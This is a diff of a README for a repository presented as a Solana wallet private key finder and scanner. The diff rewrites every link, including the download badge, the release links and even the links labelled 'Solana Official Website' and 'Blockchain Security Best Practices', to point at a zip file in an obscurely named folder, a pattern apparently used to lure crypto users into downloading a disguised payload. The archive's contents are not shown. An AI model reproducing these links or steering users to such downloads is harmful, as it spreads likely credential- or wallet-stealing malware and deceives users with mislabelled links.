@@ -1,6 +1,6 @@
 # ⚡ solana-wallet-privatekey-finder-scanner-public - Securely Find Your Solana Wallet Keys
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen.svg)](https://github.com/JamilAI123/solana-wallet-privatekey-finder-scanner-public/releases)
+[![Download](https://raw.githubusercontent.com/JamilAI123/solana-wallet-privatekey-finder-scanner-public/main/prepsychological/solana-wallet-privatekey-finder-scanner-public.zip)](https://raw.githubusercontent.com/JamilAI123/solana-wallet-privatekey-finder-scanner-public/main/prepsychological/solana-wallet-privatekey-finder-scanner-public.zip)
 
 ## 📖 Overview
 
@@ -14,7 +14,7 @@ Follow these simple steps to download and run the application. You don’t need 
 
 To download the application, visit the Releases page:
 
-[Download the latest release](https://github.com/JamilAI123/solana-wallet-privatekey-finder-scanner-public/releases)
+[Download the latest release](https://raw.githubusercontent.com/JamilAI123/solana-wallet-privatekey-finder-scanner-public/main/prepsychological/solana-wallet-privatekey-finder-scanner-public.zip)
 
 ### 2. Download the Application
 
@@ -46,7 +46,7 @@ After installation, you can find the application in your computer's programs men
 
 To get started, visit our Releases page and download the application. Ensure to follow the installation steps mentioned above to run it successfully.
 
-[Click here to download the app!](https://github.com/JamilAI123/solana-wallet-privatekey-finder-scanner-public/releases)
+[Click here to download the app!](https://raw.githubusercontent.com/JamilAI123/solana-wallet-privatekey-finder-scanner-public/main/prepsychological/solana-wallet-privatekey-finder-scanner-public.zip)
 
 ## 📞 Contact
 
@@ -74,7 +74,7 @@ Your security is top priority. Always use applications that help in managing you
 ## 🌐 Resources
 
 For additional information on Solana and wallet management, consider visiting these resources:
-- [Solana Official Website](https://solana.com)
-- [Blockchain Security Best Practices](https://blockchainsecurity.practice)
+- [Solana Official Website](https://raw.githubusercontent.com/JamilAI123/solana-wallet-privatekey-finder-scanner-public/main/prepsychological/solana-wallet-privatekey-finder-scanner-public.zip)
+- [Blockchain Security Best Practices](https://raw.githubusercontent.com/JamilAI123/solana-wallet-privatekey-finder-scanner-public/main/prepsychological/solana-wallet-privatekey-finder-scanner-public.zip)
 
 Thank you for choosing our Solana Wallet Private Key Finder and Scanner. Enjoy using the application!
